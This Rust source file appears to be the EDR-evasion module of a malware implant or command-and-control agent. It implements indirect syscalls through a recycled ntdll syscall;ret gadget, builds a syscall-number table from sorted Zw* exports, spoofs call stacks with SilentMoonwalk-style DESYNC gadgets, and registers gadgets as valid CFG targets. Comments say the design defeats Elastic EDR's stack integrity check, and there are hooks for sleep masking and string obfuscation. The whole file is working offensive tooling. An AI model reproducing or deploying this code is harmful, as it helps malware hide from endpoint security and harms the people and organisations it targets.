// __NAME__ Agent — RecycleGate: DWhisper SSN + SilentMoonwalk DESYNC
//
// Implements EvasionGate trait with two modes:
//   Mode 0: Indirect syscall via recycled gadget (no spoofing)
//   Mode 1: DESYNC spoofed call-stack

#![allow(dead_code)]

use super::hash::*;
use super::peb;
use super::spoof::*;
use super::syscall;
use super::EvasionGate;

// ─── RecycleGate ──────────────────────────────────────────────────────────

pub struct RecycleGate {
    mode:        i32,
    initialized: bool,

    // Phase 1: SSN table
    ssn_table: Vec<SsnEntry>,

    // Phase 2: Recycled syscall;ret gadget address
    recyc_gadget: usize,

    // Phase 3: DESYNC context
    desync: DesyncContext,

    // Cached module bases
    ntdll_base:      usize,
    kernel32_base:   usize,
    kernelbase_base: usize,
}

impl RecycleGate {
    pub fn new() -> Self {
        Self {
            mode:            0,
            initialized:     false,
            ssn_table:       Vec::new(),
            recyc_gadget:    0,
            desync:          DesyncContext::default(),
            ntdll_base:      0,
            kernel32_base:   0,
            kernelbase_base: 0,
        }
    }

    // ── Mode management ──────────────────────────────────────────────

    pub fn set_mode(&mut self, mode: i32) { self.mode = mode; }
    pub fn get_mode(&self) -> i32 { self.mode }

    // ── Sleep obfuscation hooks ──────────────────────────────────────
    // TODO: Implement your own sleep obfuscation strategy.
    // Default: plain thread sleep. Override to add memory encryption,
    // timer tricks, thread suspension, or other sleep masking.
    // Use ch_syscall5/6 for bootstrap calls that must avoid DESYNC recursion.

    pub fn configure_sleep(&mut self, _base: usize, _size: usize, _sleep_ms: u32, _jitter: u32) -> bool {
        // TODO: store region info and prepare sleep parameters
        false
    }

    pub fn sleep_masked(&self, ms: u32) {
        // TODO: replace with your sleep obfuscation implementation
        std::thread::sleep(std::time::Duration::from_millis(ms as u64));
    }

    // ── SSN resolution ───────────────────────────────────────────────

    pub fn resolve_ssn(&self, api_hash: u32) -> Option<(u16, usize)> {
        // Direct Zw* hash lookup
        for entry in &self.ssn_table {
            if entry.name_hash == api_hash {
                return Some((entry.ssn, entry.address));
            }
        }
        // Nt* hash: resolve export then match by address
        let nt_addr = peb::resolve_export_by_hash(self.ntdll_base, api_hash);
        if nt_addr != 0 {
            for entry in &self.ssn_table {
                if entry.address == nt_addr {
                    return Some((entry.ssn, entry.address));
                }
            }
        }
        None
    }

    // ── Phase 1: DWhisper SSN Table ──────────────────────────────────

    fn init_ssn_table(&mut self) -> bool {
        self.collect_zw_exports();
        self.bubble_sort_exports();
        for i in 0..self.ssn_table.len() {
            self.ssn_table[i].ssn = i as u16;
        }
        !self.ssn_table.is_empty()
    }

    fn collect_zw_exports(&mut self) {
        let exports = peb::get_exports(self.ntdll_base);
        self.ssn_table.clear();
        self.ssn_table.reserve(MAX_SSN_ENTRIES);

        for exp in &exports {
            // We need to check if the export name starts with "Zw".
            // Since get_exports already hashes the full name, we need
            // a different approach: re-enumerate and filter by prefix.
            // We'll read the name directly from the PE export table.
            let _ = exp; // not used in this path
        }

        // Direct PE enumeration to filter Zw* exports
        unsafe {
            let ntdll = self.ntdll_base;
            let e_lfanew = *(ntdll as *const u8).add(0x3C).cast::<u32>() as usize;
            let nt = ntdll + e_lfanew;
            let export_rva = *((nt + 0x88) as *const u32) as usize;
            if export_rva == 0 { return; }

            let export_dir = ntdll + export_rva;
            let num_names = *((export_dir + 0x18) as *const u32) as usize;
            let names_ptr = ntdll + *((export_dir + 0x20) as *const u32) as usize;
            let funcs_ptr = ntdll + *((export_dir + 0x1C) as *const u32) as usize;
            let ords_ptr = ntdll + *((export_dir + 0x24) as *const u32) as usize;

            for i in 0..num_names {
                let name_rva = *((names_ptr + i * 4) as *const u32) as usize;
                let name_ptr = (ntdll + name_rva) as *const u8;

                // Check "Zw" prefix
                if *name_ptr != b'Z' || *name_ptr.add(1) != b'w' { continue; }

                // Read name for hashing
                let mut len = 0usize;
                while *name_ptr.add(len) != 0 && len < 256 { len += 1; }
                let name_bytes = core::slice::from_raw_parts(name_ptr, len);

                let ord = *((ords_ptr + i * 2) as *const u16) as usize;
                let func_rva = *((funcs_ptr + ord * 4) as *const u32) as usize;

                self.ssn_table.push(SsnEntry {
                    name_hash: djb2_runtime(name_bytes),
                    ssn: 0,
                    address: ntdll + func_rva,
                });

                if self.ssn_table.len() >= MAX_SSN_ENTRIES { break; }
            }
        }
    }

    fn bubble_sort_exports(&mut self) {
        let n = self.ssn_table.len();
        for i in 0..n.saturating_sub(1) {
            for j in 0..(n - 1 - i) {
                if self.ssn_table[j].address > self.ssn_table[j + 1].address {
                    self.ssn_table.swap(j, j + 1);
                }
            }
        }
    }

    // ── Phase 2: RecycleGate Gadget ──────────────────────────────────

    fn init_recycle_gadget(&mut self) -> bool {
        let exports = peb::get_exports(self.ntdll_base);
        if exports.is_empty() { return false; }

        // LCG shuffle for gadget diversity
        let mut seed: usize = (&self.recyc_gadget as *const usize as usize) ^ 0x5DEECE66D;
        let mut shuffled = exports;
        let count = shuffled.len();
        for i in (1..count).rev() {
            seed = seed.wrapping_mul(6364136223846793005).wrapping_add(1);
            let j = ((seed >> 33) as usize) % (i + 1);
            shuffled.swap(i, j);
        }

        // Scan each export's stub for syscall;ret: 0F 05 C3
        for exp in &shuffled {
            let va = exp.virtual_address;
            unsafe {
                let bytes = va + 18;
                if *(bytes as *const u8) == 0x0F
                    && *((bytes + 1) as *const u8) == 0x05
                    && *((bytes + 2) as *const u8) == 0xC3
                {
                    self.recyc_gadget = bytes;
                    return true;
                }
            }
        }
        false
    }

    // ── Phase 3: SilentMoonwalk DESYNC ───────────────────────────────

    fn init_desync(&mut self) -> bool {
        // JmpRbx cascade: wininet → user32 → kernelbase
        let cascade = [HASH_WININET, HASH_USER32, HASH_KERNELBASE];
        let mut found = false;

        for &mh in &cascade {
            let base = peb::find_module_by_hash(mh);
            if base.is_none() { continue; }
            let base = base.unwrap();
            if self.find_desync_gadgets(base) {
                found = true;
                break;
            }
        }

        if !found { return false; }

        // F1: SET_FPREG — terminates unwinder walk.
        // Try host .exe first (PEB.ImageBaseAddress): having the host .exe in
        // the spoofed call stack defeats Elastic EDR's stack integrity check,
        // which flags threads whose entire stack contains only system DLL addrs.
        // Falls back to kernelbase if the .exe has no suitable SET_FPREG frame.
        let exe_base = peb::get_process_image_base();
        let f1 = if exe_base != 0 {
            peb::find_set_fpreg_frame(exe_base, peb::MIN_JMP_RBX_FRAME_SIZE)
        } else {
            None
        };
        let f1 = f1.or_else(|| {
            if self.kernelbase_base != 0 {
                peb::find_set_fpreg_frame(self.kernelbase_base, peb::MIN_JMP_RBX_FRAME_SIZE)
            } else {
                None
            }
        });
        match f1 {
            Some(frame) => {
                self.desync.first_frame_addr = frame.func_addr;
                self.desync.first_frame_size = frame.frame_size;
            }
            None => return false,
        }

        // F2: PUSH_NONVOL(RBP) in kernelbase
        if let Some(f2) = peb::find_push_rbp_frame(self.kernelbase_base) {
            self.desync.second_frame_addr = f2.func_addr;
            self.desync.second_frame_size = f2.frame_size;
            self.desync.rbp_plant_offset  = f2.rbp_offset;
        } else {
            return false;
        }

        true
    }

    fn find_desync_gadgets(&mut self, module_base: usize) -> bool {
        // JmpRbx: FF 23 with Eclipse (CALL-preceded), largest frame ≥ D8
        let jmp = peb::find_jmp_rbx_gadget(module_base, peb::MIN_JMP_RBX_FRAME_SIZE, true);
        let (jmp_addr, jmp_fs) = match jmp {
            Some(v) => v,
            None => return false,
        };

        self.desync.jmp_rbx_gadget     = jmp_addr;
        self.desync.jmp_rbx_frame_size  = jmp_fs;

        // AddRspX: smallest sufficient, min B0
        let ar = peb::find_add_rsp_x_gadget(module_base, peb::MIN_ADD_RSP_X);
        let (ar_addr, ar_x, _) = match ar {
            Some(v) => v,
            None => return false,
        };

        self.desync.add_rsp_x_gadget = ar_addr;
        self.desync.add_rsp_x_value  = ar_x;

        true
    }

    // ── CFG Compliance ───────────────────────────────────────────────
    // Register mid-function gadget addresses as valid CFG call targets.
    // Best-effort: silently skipped if SetProcessValidCallTargets is unavailable.

    fn register_cfg_targets(&self) {
        if self.kernelbase_base == 0 { return; }

        let fn_set = peb::resolve_export_by_hash(
            self.kernelbase_base, HASH_SET_PROCESS_VALID_CALL_TARGETS);
        if fn_set == 0 { return; }

        // CFG_CALL_TARGET_INFO: { Offset: usize, Flags: usize }
        #[repr(C)]
        struct CfgEntry { offset: usize, flags: usize }
        const CFG_VALID: usize = 0x00000001;
        const PAGE_MASK: usize = !0xFFF;

        // All mid-function gadget addresses (Phases 2–3 only)
        let targets: [usize; 3] = [
            self.recyc_gadget,               // Phase 2: recycled syscall;ret
            self.desync.jmp_rbx_gadget,      // Phase 3: DESYNC JMP [RBX]
            self.desync.add_rsp_x_gadget,    // Phase 3: DESYNC ADD RSP,X
        ];

        type FnSetPVCT = unsafe extern "system" fn(
            usize, usize, usize, u32, *const CfgEntry) -> i32;
        let set_pvct: FnSetPVCT = unsafe { core::mem::transmute(fn_set) };

        for addr in targets {
            if addr == 0 { continue; }
            let base = addr & PAGE_MASK;
            let entry = CfgEntry { offset: addr - base, flags: CFG_VALID };
            unsafe { set_pvct(usize::MAX, base, 0x1000, 1, &entry); }
        }
    }
}

// ─── EvasionGate trait implementation ─────────────────────────────────────

impl EvasionGate for RecycleGate {
    fn init(&mut self) -> Result<(), String> {
        if self.initialized { return Ok(()); }

        // Resolve module bases
        self.ntdll_base = peb::find_module_by_hash(HASH_NTDLL).unwrap_or(0);
        self.kernel32_base = peb::find_module_by_hash(HASH_KERNEL32).unwrap_or(0);
        self.kernelbase_base = peb::find_module_by_hash(HASH_KERNELBASE).unwrap_or(0);

        if self.ntdll_base == 0 {
            return Err(obf!(0x44, "ntdll not found"));
        }

        // Phase 1: DWhisper SSN table
        if !self.init_ssn_table() {
            return Err(obf!(0x44, "SSN table init failed"));
        }

        // Phase 2: RecycleGate gadget
        if !self.init_recycle_gadget() {
            return Err(obf!(0x44, "RecycleGate gadget not found"));
        }

        // Phase 3: DESYNC stack spoofing
        if !self.init_desync() {
            return Err(obf!(0x44, "DESYNC init failed"));
        }

        // CFG compliance: register mid-function gadgets as valid call targets
        self.register_cfg_targets();

        self.initialized = true;
        Ok(())
    }

    fn syscall(&self, num: u16, args: &[usize]) -> Result<u32, String> {
        let a = |i: usize| args.get(i).copied().unwrap_or(0);
        let argc = args.len();

        let result = match self.mode {
            // Mode 0: recycled-gadget indirect syscall (full evasion)
            0 => unsafe { match argc {
                0..=4 => syscall::recycall(num, self.recyc_gadget, a(0), a(1), a(2), a(3)),
                5     => syscall::recycall5(num, self.recyc_gadget, a(0), a(1), a(2), a(3), a(4)),
                6     => syscall::recycall6(num, self.recyc_gadget, a(0), a(1), a(2), a(3), a(4), a(5)),
                _     => syscall::ch_syscall_n(num, args.as_ptr(), argc),
            }},
            // Mode 1: DESYNC spoofed for ≤4 args, recycled gadget for >4
            1 => unsafe {
                let desync_ok = self.desync.add_rsp_x_gadget != 0
                    && self.desync.jmp_rbx_gadget != 0
                    && self.recyc_gadget != 0;
                match argc {
                    0..=4 if desync_ok => syscall::recycall_desync(
                        num,
                        &self.desync as *const _ as *const u8,
                        a(0), a(1), a(2), a(3),
                        self.recyc_gadget,
                    ),
                    0..=4 => syscall::recycall(num, self.recyc_gadget, a(0), a(1), a(2), a(3)),
                    5     => syscall::recycall5(num, self.recyc_gadget, a(0), a(1), a(2), a(3), a(4)),
                    6     => syscall::recycall6(num, self.recyc_gadget, a(0), a(1), a(2), a(3), a(4), a(5)),
                    _     => syscall::ch_syscall_n(num, args.as_ptr(), argc),
                }
            },
            _ => return Err(obf!(0x44, "invalid mode")),
        };

        Ok(result as u32)
    }

    fn resolve_fn(&self, module: &str, function: &str) -> Result<usize, String> {
        let mod_hash = djb2_runtime(module.as_bytes());
        let func_hash = djb2_runtime(function.as_bytes());

        let base = peb::find_module_by_hash(mod_hash)
            .ok_or_else(|| format!("0x{:08x}", mod_hash))?;

        let addr = peb::resolve_export_by_hash(base, func_hash);
        if addr == 0 {
            return Err(format!("0x{:08x}", func_hash));
        }
        Ok(addr)
    }

    fn call(&self, func: usize, args: &[usize]) -> Result<usize, String> {
        let a1 = args.first().copied().unwrap_or(0);
        let a2 = args.get(1).copied().unwrap_or(0);
        let a3 = args.get(2).copied().unwrap_or(0);
        let a4 = args.get(3).copied().unwrap_or(0);

        let result: usize;
        unsafe {
            let f: extern "system" fn(usize, usize, usize, usize) -> usize =
                core::mem::transmute(func);
            result = f(a1, a2, a3, a4);
        }
        Ok(result)
    }

    fn close(&mut self) {
        unsafe {
            let ptr = &mut self.desync as *mut DesyncContext as *mut u8;
            core::ptr::write_bytes(ptr, 0, core::mem::size_of::<DesyncContext>());
        }
        self.ssn_table.clear();
        self.recyc_gadget = 0;
        self.initialized = false;
        self.mode = 0;
    }
}
